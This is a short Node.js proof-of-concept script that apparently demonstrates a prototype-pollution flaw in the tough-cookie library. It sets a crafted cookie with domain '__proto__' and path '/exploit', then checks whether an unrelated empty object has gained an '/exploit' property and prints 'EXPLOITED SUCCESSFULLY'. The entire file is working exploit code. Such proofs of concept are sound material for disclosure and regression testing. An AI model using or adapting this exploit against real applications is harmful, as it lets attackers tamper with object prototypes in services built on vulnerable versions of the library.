const tough = require("tough-cookie");

const jar = new tough.CookieJar(undefined, {
  rejectPublicSuffixes: false,
});
const cookieStr = "sha6key=sha8vlue; domain=__proto__; path=/exploit";
const cookie = tough.Cookie.parse(cookieStr);
jar.setCookie(cookie, "https://__proto__/", (error) => {
  if (error) {
    console.log(error);
  }
});
verySecretBank = {};
if (verySecretBank["/exploit"] !== undefined) {
  console.log("EXPLOITED SUCCESSFULLY");
} else {
  console.log("EXPLOIT FAILED");
}
